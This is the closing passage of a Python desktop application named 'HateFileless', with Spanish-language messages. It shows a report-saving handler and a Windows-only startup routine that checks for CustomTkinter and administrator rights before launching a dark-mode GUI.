            self._toast(f'✓ Informe guardado: {Path(path).name}')
            if path.lower().endswith('.html') and sys.platform == 'win32':
                os.startfile(path)
        except Exception as e:
            messagebox.showerror('HateFileless', f'No se pudo guardar:\n{e}')

# ═══════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════
def main():
    demo = '--demo' in sys.argv
    if sys.platform != 'win32' and not demo:
        print('Solo Windows.'); sys.exit(1)
    if ctk is None:
        msg = 'Falta CustomTkinter.\n  pip install customtkinter'
        try:
            r = tk.Tk(); r.withdraw()
            messagebox.showerror('HateFileless', msg); r.destroy()
        except Exception: print(msg)
        sys.exit(1)
    ctk.set_appearance_mode('dark')
    app = App(admin=is_admin(), demo=demo)
    Splash(app, on_done=app.reveal)
    app.mainloop()

if __name__ == '__main__':
    main()
